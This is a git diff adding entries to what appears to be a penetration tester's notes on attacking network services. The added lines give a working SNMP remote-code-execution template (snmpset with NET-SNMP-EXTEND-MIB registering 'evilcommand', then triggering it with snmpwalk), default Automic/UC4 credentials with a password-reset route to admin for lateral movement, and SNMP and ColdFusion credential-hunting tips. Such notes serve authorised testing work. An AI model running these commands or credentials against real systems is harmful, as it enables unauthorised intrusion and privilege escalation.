@@ -167,6 +167,10 @@ if (request.getParameter("cmd") != null) {
   - `braa {community_string}@{IP}:.1.3.6.*`
   - Then grep for `trap` to find the private community string, `login` or `fail` to search for failed logins, or `@` for email addresses
 - Can be used for RCE given a few caveats: [https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/snmp-rce.html)
+- RCE via write access
+  - We can use `snmpset` to add additional commands that can be used over SNMP
+  - `snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c {community_string} {IP} 'nsExtendStatus."evilcommand"' = createAndGo 'nsExtendCommand."evilcommand"' = /bin/echo 'nsExtendArgs."evilcommand"' = 'hello world'`
+  - We can then call our new command with `snmpwalk -v2c -c {community_string} {IP} NET-SNMP-EXTEND-MIB::nsExtendObjects`
 
 ## MQTT
 - A service, usually for IoT devices, which allows the publishing of and subscribing to information
@@ -239,6 +243,11 @@ interval = 10
 - ColdFusion Markup Language (CFML) is the programming languaged used for web apps, but can integrate deeper (like performing SQL queries or email management)
 - Find version from application error messages; many CVEs exist
 - `{cf_root_dir}/lib/password.properties` has encrypted passwords in key-value pairs
+
+## Automic/UC4
+- Broadcom-purchased platform for performing automation using databases and agents (which are basically AD-connected boxes we have admin on)
+- Default creds are UC/UC/UC on client 0, but most interesting stuff (like agents and variables, which can have passwords) will be in client 1
+- If we can reset the password of someone in client 1 and promote them to an admin, this gives us access to everything, which is great for lateral movement
 
 ## IIS Servers
 - Some versions of Microsoft servers create short file names for files ({8_char_filename}.{3_char_extension})
